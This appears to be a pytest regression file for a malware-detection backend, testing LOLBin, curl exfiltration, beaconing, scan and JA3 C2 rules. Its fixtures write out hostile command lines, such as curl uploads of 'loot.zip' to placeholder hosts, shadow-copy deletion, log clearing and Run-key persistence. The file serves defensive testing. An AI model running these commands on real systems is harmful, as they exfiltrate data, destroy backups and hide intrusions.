"""Accuracy regressions from the backend code-review pass — each test pins a
real false-positive / drift bug that shipped: the bare `-decode` LOLBin branch,
the unanchored curl upload flags, the JA3 severity drift, and private-range
C2 framing. Also the RULE_META parity gate so future rule_id/severity drift
fails loudly here instead of silently in the Navigator."""

import re

import pytest

from ..services import detection
from ..services import risk as risk_service
from .conftest import make_run


def _ts(offset_seconds: int = 0) -> str:
    import datetime

    return (
        datetime.datetime(2026, 8, 1, 12, 0, 0, tzinfo=datetime.timezone.utc)
        + datetime.timedelta(seconds=offset_seconds)
    ).isoformat()


def _ingest(client, run_id: str, events: list[dict]) -> None:
    resp = client.post("/ingest/batch", json=events)
    assert resp.status_code == 202, resp.text


def _proc(run_id: str, pid: int, cmd: str, ts: int = 0) -> dict:
    return {
        "run_id": run_id, "platform": "linux", "event_type": "process_create",
        "timestamp": _ts(ts), "pid": pid, "process_name": "sh",
        "command_line": cmd,
    }


def _net(run_id: str, ip: str, port: int, pid: int, proc: str, ts: int = 0,
         ja3: str | None = None, sni: str | None = None) -> dict:
    ev = {
        "run_id": run_id, "platform": "windows", "event_type": "network_connection",
        "timestamp": _ts(ts), "pid": pid, "process_name": proc,
        "dest_ip": ip, "dest_port": port, "protocol": "TCP",
        # JA3 is only evaluated when an SNI is present (RFC 6066 flow).
        "tls_sni": sni or "telemetry.invalid",
    }
    if ja3:
        ev["ja3"] = ja3
    return ev


def _alerts(client, run_id: str) -> list[dict]:
    return client.get(f"/runs/{run_id}/alerts").json()


# -- LOLBin regex scope --------------------------------------------------------


def test_openssl_decode_is_not_lolbin(client):
    """The old `certutil.*-urlcache|-decode` alternation fired lolbin-abuse on
    ANY command containing `-decode` — e.g. an openssl decrypt with no
    certutil in sight."""
    run_id = make_run(client, sample_name="decode.bin", platform="linux")
    _ingest(client, run_id, [_proc(run_id, 10, "openssl aes-256-cbc -d -in x.enc -out x.bin")])
    assert [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"] == []


def test_certutil_decode_still_fires(client):
    run_id = make_run(client, sample_name="cert.exe", platform="windows")
    _ingest(client, run_id, [{
        "run_id": run_id, "platform": "windows", "event_type": "process_create",
        "timestamp": _ts(0), "pid": 11, "process_name": "certutil.exe",
        "command_line": "certutil.exe -decode b64.txt payload.bin",
    }])
    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "lolbin-abuse"]
    assert len(fired) == 1 and "certutil" in fired[0]["details"]


# -- Upload flag anchoring ------------------------------------------------------


def test_curl_plain_headers_are_not_exfil(client):
    """Ordinary header/option curls must not match the upload signature — the
    unanchored `-T` matched inside `Content-Type` and `--connect-timeout`."""
    for cmdline in (
        'curl -H "Content-Type: application/json" -d \'{"a":1}\' http://203.0.113.5/api',
        "curl --connect-timeout 2 http://203.0.113.5/health",
        'curl -F name=value http://203.0.113.5/form',  # form POST without @file
    ):
        assert detection._UPLOAD_RE.search(cmdline) is None, cmdline


def test_curl_real_upload_forms_match(client):
    for cmdline in (
        "curl --upload-file loot.zip http://203.0.113.9/up",
        "curl -T loot.zip http://203.0.113.9/up",
        "curl -Tloot.zip http://203.0.113.9/up",
        "curl --data-binary @loot.zip http://203.0.113.9/up",
        "curl -Ffile=@loot.zip http://203.0.113.9/up",
    ):
        assert detection._UPLOAD_RE.search(cmdline), cmdline


# -- Private ranges are not external C2 -----------------------------------------


def test_beaconing_ignores_private_destinations(client):
    """RFC1918 peers are lateral/topology, not external C2 — regular-interval
    polling of an internal host used to fire beaconing malicious."""
    run_id = make_run(client, sample_name="internal-beacon.exe")
    _ingest(client, run_id, [
        _net(run_id, "192.168.1.50", 8080, pid=100 + i, proc="svc.exe", ts=i * 30)
        for i in range(6)
    ])
    assert [a for a in _alerts(client, run_id) if a["rule_id"] == "beaconing"] == []


def test_beaconing_still_fires_on_public_destinations(client):
    run_id = make_run(client, sample_name="external-beacon.exe")
    _ingest(client, run_id, [
        _net(run_id, "198.51.100.20", 443, pid=200 + i, proc="svc.exe", ts=i * 30)
        for i in range(6)
    ])
    assert any(a["rule_id"] == "beaconing" for a in _alerts(client, run_id))


def test_network_scan_ignores_private_destinations(client):
    run_id = make_run(client, sample_name="internal-scan.exe")
    _ingest(client, run_id, [
        _net(run_id, f"10.0.0.{i}", 445, pid=300 + i, proc="probe.exe", ts=i)
        for i in range(1, 15)
    ])
    assert not [
        a for a in _alerts(client, run_id)
        if a["rule_id"].startswith(("network-scan", "fanout"))
    ]


# -- JA3 split + RULE_META parity ------------------------------------------------


def test_known_c2_ja3_gets_own_rule_and_malicious_severity(client):
    run_id = make_run(client, sample_name="cs-handshake.exe")
    _ingest(client, run_id, [
        _net(run_id, "198.51.100.30", 443, pid=400, proc="explorer.exe",
             ja3="a0e9f5d64349fb13191bc781f81f42e1"),
    ])

    fired = [a for a in _alerts(client, run_id) if a["rule_id"] == "tls-ja3-c2"]
    assert len(fired) == 1
    assert fired[0]["severity"] == "malicious"
    # No drift back onto the suspicious SNI rule.
    assert [a for a in _alerts(client, run_id) if a["rule_id"] == "tls-sni-suspicious"] == []


@pytest.mark.parametrize("meta_key", ["severity", "tactic"])
def test_rule_meta_parity_with_emitted_alerts(client, meta_key):
    """Every (rule_id → field) the detector emits must be declared in RULE_META.
    This is the drift gate: Navigator/coverage render RULE_META while findings
    render what detection emitted — they may never disagree again."""
    meta = risk_service.RULE_META
    stage_map = getattr(detection, "_KILL_CHAIN_STAGE", {})
    assert isinstance(meta, dict) and meta

    # Static parity over every literal rule_id string in the source.
    source = open(detection.__file__, encoding="utf-8").read()
    quoted = set(re.findall(r'[\'"]([a-z][a-z0-9-]{3,40})[\'"]', source))
    heuristic_ids = {r for r in quoted if r in meta}  # ids already known to META
    assert heuristic_ids, "sanity: expected overlap between source ids and META"

    # Runtime parity: exercise the pure evaluators with synthetic events and
    # confirm whatever fires is declared with a matching severity.
    def _evt(**kw):
        base = {
            "run_id": "parity", "platform": "windows",
            "event_type": "process_create", "timestamp": _ts(),
            "pid": 1, "ppid": 0, "process_name": "x.exe", "command_line": "",
        }
        base.update(kw)
        return base

    probe_events = [
        _evt(command_line="powershell -enc AAAA"),
        _evt(command_line="wevtutil cl Security"),
        _evt(command_line="reg add HKCU\\Run /v Updater /d evil.exe"),
        _evt(command_line="vssadmin delete shadows /all"),
        _evt(event_type="network_connection", dest_ip="198.51.100.7", dest_port=4444),
        _evt(event_type="file_write", file_path="C:\\Users\\a.docx.locked"),
    ]
    pure_checks = [
        detection.check_masquerading,
        detection.check_lolbin_abuse,
        detection.check_registry_persistence,
        detection.check_autostart_persistence,
        detection.check_ssh_authorized_keys,
        detection.check_suid_set,
        detection.check_credential_dump,
        detection.check_suspicious_extension,
        detection.check_unusual_port,
        detection.check_lateral_rdp_smb,
        detection.check_lateral_psexec_smb,
        detection.check_lateral_winrm_wmi,
        detection.check_lateral_smb_share,
        detection.check_dns_unusual_port,
        detection.check_tls_sni_suspicious,
        detection.check_doh_resolver_use,
    ]
    for ev in probe_events:
        for check in pure_checks:
            alert = check(ev)
            if alert is None:
                continue
            rid = alert.rule_id
            assert rid in meta, f"{rid} emitted but missing from RULE_META"
            assert alert.severity == meta[rid]["severity"], (
                f"{rid} severity drift: emitted {alert.severity}, "
                f"META says {meta[rid]['severity']}"
            )
            if rid in stage_map:
                assert meta[rid]["tactic"] == stage_map[rid], (
                    f"{rid} tactic/META disagreement"
                )
